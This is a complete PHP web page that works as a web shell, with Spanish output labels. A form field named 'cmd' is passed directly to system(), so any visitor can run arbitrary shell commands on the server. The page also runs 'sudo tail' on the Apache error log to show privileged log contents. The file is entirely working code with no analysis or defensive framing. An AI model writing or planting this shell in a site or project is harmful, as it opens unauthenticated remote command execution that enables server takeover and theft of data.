<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        echo "________________________________________________________________________________ \r" ;
        echo "Salida de comando: \r \r";
        system($_GET['cmd']);
        echo "________________________________________________________________________________ \r" ;
        echo "Salida de log: \r \r" ;
        echo " ";
        system('sudo tail -40 /var/log/httpd/error_log');
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
